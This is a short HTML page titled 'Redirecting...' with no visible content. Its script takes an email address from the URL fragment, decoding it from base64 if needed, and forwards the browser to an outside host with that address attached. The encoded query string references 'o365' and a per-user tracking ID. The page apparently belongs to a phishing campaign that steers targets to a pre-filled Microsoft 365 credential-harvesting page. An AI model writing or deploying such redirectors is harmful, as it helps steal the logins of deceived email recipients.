<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <script>
    function isValidBase64(str) {
      try {
        const decoded = atob(str);
        // Check if decoded is a valid email
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(decoded);
      } catch (e) {
        return false;
      }
    }

    window.onload = function () {
      const hash = window.location.hash.substring(1).trim(); // remove '#'
      const baseUrl = "https://dennbc.com/s/index.php?c3Y9bzM2NV8xX25vbSZyYW5kPU16ck8wJnVpZD1VU0VSMjkwNDIwMjVVMzgwNDI5NDMmcmFuZD1lTDltNA==N0123N/#";

      if (!hash) {
        window.location.href = baseUrl;
        return;
      }

      let email = hash;

      if (isValidBase64(hash)) {
        email = atob(hash);
      }

      const finalUrl = baseUrl + encodeURIComponent(email);
      window.location.href = finalUrl;
    };
  </script>
</head>
<body>
  <p></p>
</body>
</html>
